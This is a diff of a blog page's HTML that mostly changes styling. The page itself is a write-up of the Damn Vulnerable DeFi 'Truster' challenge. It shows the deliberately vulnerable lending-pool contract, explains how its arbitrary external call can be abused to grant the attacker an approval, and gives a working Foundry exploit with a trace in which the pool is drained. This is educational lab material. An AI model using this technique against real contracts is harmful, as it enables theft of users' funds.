@@ -113,26 +113,22 @@ But don’t worry, you might be able to take them all from the pool. In a single
 <link rel="preload" href="https://vyorkin.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="https://vyorkin.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
 
-
-  
-  
-  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.07092c1350ffd254998dc43a44ae96e617d14af4df4602626878df89189c5e1a.css" integrity="sha256-BwksE1D/0lSZjcQ6RK6W5hfRSvTfRgJiaHjfiRicXho=" crossorigin="anonymous" media="screen" />
-
-
-
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
 
 
   
-    
-    
-    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
   
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.070807f22ed87a923883f1a61d2e227d67d923b7fa424ed9a2bf875f4949406e.css" integrity="sha256-BwgH8i7YepI4g/GmHS4ifWfZI7f6Qk7Zor&#43;HX0lJQG4=" crossorigin="anonymous" media="screen" />
+
+
+
+
 
 
 
 
   
-  <link rel="stylesheet" href="https://vyorkin.org/custom.min.cf4424ca575c8638b55547ace7bc3ab68c44ff1c808b1f1bb2358cdbcdbd8c41.css" integrity="sha256-z0Qkyldchji1VUes57w6toxE/xyAix8bsjWM2829jEE=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/custom.min.e79d44f53b0c4396d73bb2d809d0abbfb31a859a259ae12ed5d6c3a2af56d353.css" integrity="sha256-551E9TsMQ5bXO7LYCdCrv7MahZolmuEu1dbDoq9W01M=" crossorigin="anonymous" media="screen" />
 
 
 <link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
@@ -158,9 +154,7 @@ But don’t worry, you might be able to take them all from the pool. In a single
 
 
 
-
-
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-light">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -199,8 +193,6 @@ But don’t worry, you might be able to take them all from the pool. In a single
           
           
             
-          
-            
               
                 <li class="navigation-item menu-separator">
                   <span>|</span>
@@ -210,6 +202,8 @@ But don’t worry, you might be able to take them all from the pool. In a single
               <li class="navigation-item">
                 <a href="https://vyorkin.org/ru-ru/">ru</a>
               </li>
+            
+          
             
           
             
@@ -280,45 +274,45 @@ have nothing.</p>
 pool. In a single transaction.</p>
 </blockquote>
 
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> <span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">12</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {IERC20} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/token/ERC20/IERC20.sol&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {Address} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/utils/Address.sol&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {ReentrancyGuard} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/security/ReentrancyGuard.sol&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @title TrusterLenderPool
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> */</span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> TrusterLenderPool <span style="color:#fff;font-weight:bold">is</span> ReentrancyGuard {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">using</span> Address <span style="color:#fff;font-weight:bold">for</span> <span style="color:#fff;font-weight:bold">address</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    IERC20 <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">immutable</span> damnValuableToken;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    error NotEnoughTokensInPool();
-</span></span><span style="display:flex;"><span>    error FlashLoanHasNotBeenPaidBack();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(<span style="color:#fff;font-weight:bold">address</span> tokenAddress) {
-</span></span><span style="display:flex;"><span>        damnValuableToken = IERC20(tokenAddress);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> flashLoan(
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> borrowAmount,
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">address</span> borrower,
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">address</span> target,
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">bytes</span> calldata <span style="color:#fff;font-weight:bold">data</span>
-</span></span><span style="display:flex;"><span>    ) <span style="color:#fff;font-weight:bold">external</span> nonReentrant {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = damnValuableToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; borrowAmount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughTokensInPool();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        damnValuableToken.<span style="color:#fff;font-weight:bold">transfer</span>(borrower, borrowAmount);
-</span></span><span style="display:flex;"><span>        target.functionCall(<span style="color:#fff;font-weight:bold">data</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> balanceAfter = damnValuableToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (balanceAfter &lt; balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;openzeppelin-contracts/token/ERC20/IERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Address</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;openzeppelin-contracts/utils/Address.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">ReentrancyGuard</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;openzeppelin-contracts/security/ReentrancyGuard.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @title TrusterLenderPool
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">TrusterLenderPool</span> <span class="k">is</span> <span class="n">ReentrancyGuard</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="kt">address</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">damnValuableToken</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">NotEnoughTokensInPool</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">FlashLoanHasNotBeenPaidBack</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">tokenAddress</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">damnValuableToken</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">tokenAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">borrowAmount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">borrower</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">target</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="n">nonReentrant</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="n">damnValuableToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">balanceBefore</span> <span class="o">&lt;</span> <span class="n">borrowAmount</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">NotEnoughTokensInPool</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">damnValuableToken</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">borrower</span><span class="p">,</span> <span class="n">borrowAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">target</span><span class="p">.</span><span class="n">functionCall</span><span class="p">(</span><span class="nb">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">balanceAfter</span> <span class="o">=</span> <span class="n">damnValuableToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">balanceAfter</span> <span class="o">&lt;</span> <span class="n">balanceBefore</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">FlashLoanHasNotBeenPaidBack</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h2 id="analysis">
   Analysis
   <a class="heading-link" href="#analysis">
@@ -328,7 +322,7 @@ pool. In a single transaction.</p>
 </h2>
 <p>The contract keeps a reference to the DVT ERC20 token, which is
 set in the constructor:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>IERC20 <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">immutable</span> damnValuableToken;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">IERC20</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">damnValuableToken</span><span class="p">;</span>
 </span></span></code></pre></div><p>The <code>flashLoan</code> function takes 4 arguments:</p>
 <ul>
 <li><code>uint256 borrowAmount</code> &ndash; The amount of DVT tokens user wants
@@ -343,17 +337,17 @@ is called on <code>target</code> contract 🤔.</li>
 <p>In the very beginning this function checks that the
 contract has enough tokens to lend and transfers the requested
 <code>borrowAmount</code> to the <code>borrower</code> address:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = damnValuableToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; borrowAmount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughTokensInPool();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>damnValuableToken.<span style="color:#fff;font-weight:bold">transfer</span>(borrower, borrowAmount);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="n">damnValuableToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">balanceBefore</span> <span class="o">&lt;</span> <span class="n">borrowAmount</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">NotEnoughTokensInPool</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">damnValuableToken</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">borrower</span><span class="p">,</span> <span class="n">borrowAmount</span><span class="p">);</span>
 </span></span></code></pre></div><p>And at the end it ensures that the borrower has repaid the
 flash loan:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> balanceAfter = damnValuableToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (balanceAfter &lt; balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="n">balanceAfter</span> <span class="o">=</span> <span class="n">damnValuableToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">balanceAfter</span> <span class="o">&lt;</span> <span class="n">balanceBefore</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">FlashLoanHasNotBeenPaidBack</span><span class="p">();</span>
 </span></span></code></pre></div><p>Everything looks good so far&hellip; until we encounter this line
 right after transferring funds to the borrower:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>target.functionCall(<span style="color:#fff;font-weight:bold">data</span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">target</span><span class="p">.</span><span class="n">functionCall</span><span class="p">(</span><span class="nb">data</span><span class="p">);</span>
 </span></span></code></pre></div><p>The
 <a href="https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-"  class="external-link" target="_blank" rel="noopener">functionCall</a>
 is defined in the OpenZeppelin&rsquo;s <code>Address</code> library:</p>
@@ -384,53 +378,53 @@ anything at all. Then we can pass the encoded
 function to set the attacker an allowance to spend all the
 <code>TrusterLenderPool</code>&rsquo;s tokens. Finally, the attacker can transfer
 all the DVT tokens to its account.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = dvt.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(trusterLenderPool));
-</span></span><span style="display:flex;"><span>    vm.prank(attacker);
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">bytes</span> <span style="color:#fff;font-weight:bold">memory</span> attrackCallData = <span style="color:#fff;font-weight:bold">abi</span>.<span style="color:#fff;font-weight:bold">encodeWithSignature</span>(
-</span></span><span style="display:flex;"><span>        <span style="color:#0ff;font-weight:bold">&#34;approve(address,uint256)&#34;</span>,
-</span></span><span style="display:flex;"><span>        attacker,
-</span></span><span style="display:flex;"><span>        poolBalance
-</span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>    trusterLenderPool.flashLoan(<span style="color:#ff0;font-weight:bold">0</span>, attacker, <span style="color:#fff;font-weight:bold">address</span>(dvt), attrackCallData);
-</span></span><span style="display:flex;"><span>    vm.prank(attacker);
-</span></span><span style="display:flex;"><span>    dvt.transferFrom(<span style="color:#fff;font-weight:bold">address</span>(trusterLenderPool), attacker, poolBalance);
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
-</span></span><span style="display:flex;"><span>    validation();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">testExploit</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** EXPLOIT START **/</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">poolBalance</span> <span class="o">=</span> <span class="n">dvt</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">trusterLenderPool</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">attrackCallData</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;approve(address,uint256)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">attacker</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">poolBalance</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">trusterLenderPool</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">attacker</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">dvt</span><span class="p">),</span> <span class="n">attrackCallData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dvt</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">trusterLenderPool</span><span class="p">),</span> <span class="n">attacker</span><span class="p">,</span> <span class="n">poolBalance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** EXPLOIT END **/</span>
+</span></span><span class="line"><span class="cl">    <span class="n">validation</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>We don&rsquo;t care about the <code>borrower</code> argument here, since we
 aren&rsquo;t borrowing anything. So it could be any other address
 instead, except the <code>address(0)</code>.</p>
 <p>The trace:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>[72299] Truster::testExploit()
-</span></span><span style="display:flex;"><span>  ├─ [2562] DVT::balanceOf(Truster Lender Pool: [...]) [staticcall]
-</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#ff0;font-weight:bold">1000000000000000000000000</span>
-</span></span><span style="display:flex;"><span>  ├─ [0] VM::prank(Attacker: [...])
-</span></span><span style="display:flex;"><span>  │   └─ ← ()
-</span></span><span style="display:flex;"><span>  ├─ [36532] Truster Lender Pool::flashLoan(0, Attacker: [...], DVT: [...], ...)
-</span></span><span style="display:flex;"><span>  │   ├─ [562] DVT::balanceOf(Truster Lender Pool: [...]) [staticcall]
-</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#ff0;font-weight:bold">1000000000000000000000000</span>
-</span></span><span style="display:flex;"><span>  │   ├─ [5270] DVT::transfer(Attacker: [...], 0)
-</span></span><span style="display:flex;"><span>  │   │   ├─ emit Transfer(from: Truster Lender Pool: [...], to: Attacker: [...], value: 0)
-</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>  │   ├─ [24624] DVT::approve(Attacker: [...], 1000000000000000000000000)
-</span></span><span style="display:flex;"><span>  │   │   ├─ emit Approval(owner: Truster Lender Pool: [...], spender: Attacker: [...], value: 1000000000000000000000000)
-</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>  │   ├─ [562] DVT::balanceOf(Truster Lender Pool: [...]) [staticcall]
-</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#ff0;font-weight:bold">1000000000000000000000000</span>
-</span></span><span style="display:flex;"><span>  │   └─ ← ()
-</span></span><span style="display:flex;"><span>  ├─ [0] VM::prank(Attacker: [...])
-</span></span><span style="display:flex;"><span>  │   └─ ← ()
-</span></span><span style="display:flex;"><span>  ├─ [22927] DVT::transferFrom(Truster Lender Pool: [...], Attacker: [...], 1000000000000000000000000)
-</span></span><span style="display:flex;"><span>  │   ├─ emit Approval(owner: Truster Lender Pool: [...], spender: Attacker: [...], value: 0)
-</span></span><span style="display:flex;"><span>  │   ├─ emit Transfer(from: Truster Lender Pool: [...], to: Attacker: [...], value: 1000000000000000000000000)
-</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>  ├─ [562] DVT::balanceOf(Truster Lender Pool: [...]) [staticcall]
-</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#ff0;font-weight:bold">0</span>
-</span></span><span style="display:flex;"><span>  ├─ [562] DVT::balanceOf(Attacker: [...]) [staticcall]
-</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#ff0;font-weight:bold">1000000000000000000000000</span>
-</span></span><span style="display:flex;"><span>  └─ ← ()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>72299<span class="o">]</span> Truster::testExploit<span class="o">()</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>2562<span class="o">]</span> DVT::balanceOf<span class="o">(</span>Truster Lender Pool: <span class="o">[</span>...<span class="o">])</span> <span class="o">[</span>staticcall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="m">1000000000000000000000000</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>0<span class="o">]</span> VM::prank<span class="o">(</span>Attacker: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>36532<span class="o">]</span> Truster Lender Pool::flashLoan<span class="o">(</span>0, Attacker: <span class="o">[</span>...<span class="o">]</span>, DVT: <span class="o">[</span>...<span class="o">]</span>, ...<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   ├─ <span class="o">[</span>562<span class="o">]</span> DVT::balanceOf<span class="o">(</span>Truster Lender Pool: <span class="o">[</span>...<span class="o">])</span> <span class="o">[</span>staticcall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">  │   │   └─ ← <span class="m">1000000000000000000000000</span>
+</span></span><span class="line"><span class="cl">  │   ├─ <span class="o">[</span>5270<span class="o">]</span> DVT::transfer<span class="o">(</span>Attacker: <span class="o">[</span>...<span class="o">]</span>, 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   │   ├─ emit Transfer<span class="o">(</span>from: Truster Lender Pool: <span class="o">[</span>...<span class="o">]</span>, to: Attacker: <span class="o">[</span>...<span class="o">]</span>, value: 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   │   └─ ← <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">  │   ├─ <span class="o">[</span>24624<span class="o">]</span> DVT::approve<span class="o">(</span>Attacker: <span class="o">[</span>...<span class="o">]</span>, 1000000000000000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   │   ├─ emit Approval<span class="o">(</span>owner: Truster Lender Pool: <span class="o">[</span>...<span class="o">]</span>, spender: Attacker: <span class="o">[</span>...<span class="o">]</span>, value: 1000000000000000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   │   └─ ← <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">  │   ├─ <span class="o">[</span>562<span class="o">]</span> DVT::balanceOf<span class="o">(</span>Truster Lender Pool: <span class="o">[</span>...<span class="o">])</span> <span class="o">[</span>staticcall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">  │   │   └─ ← <span class="m">1000000000000000000000000</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>0<span class="o">]</span> VM::prank<span class="o">(</span>Attacker: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>22927<span class="o">]</span> DVT::transferFrom<span class="o">(</span>Truster Lender Pool: <span class="o">[</span>...<span class="o">]</span>, Attacker: <span class="o">[</span>...<span class="o">]</span>, 1000000000000000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   ├─ emit Approval<span class="o">(</span>owner: Truster Lender Pool: <span class="o">[</span>...<span class="o">]</span>, spender: Attacker: <span class="o">[</span>...<span class="o">]</span>, value: 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   ├─ emit Transfer<span class="o">(</span>from: Truster Lender Pool: <span class="o">[</span>...<span class="o">]</span>, to: Attacker: <span class="o">[</span>...<span class="o">]</span>, value: 1000000000000000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>562<span class="o">]</span> DVT::balanceOf<span class="o">(</span>Truster Lender Pool: <span class="o">[</span>...<span class="o">])</span> <span class="o">[</span>staticcall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>562<span class="o">]</span> DVT::balanceOf<span class="o">(</span>Attacker: <span class="o">[</span>...<span class="o">])</span> <span class="o">[</span>staticcall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="m">1000000000000000000000000</span>
+</span></span><span class="line"><span class="cl">  └─ ← <span class="o">()</span>
 </span></span></code></pre></div><h2 id="remediation">
   Remediation
   <a class="heading-link" href="#remediation">
@@ -497,7 +491,7 @@ Side entrance</a>.</p>
     
       1985 -
     
-    2025
+    2026
      Vasiliy Yorkin 
     
   </section>
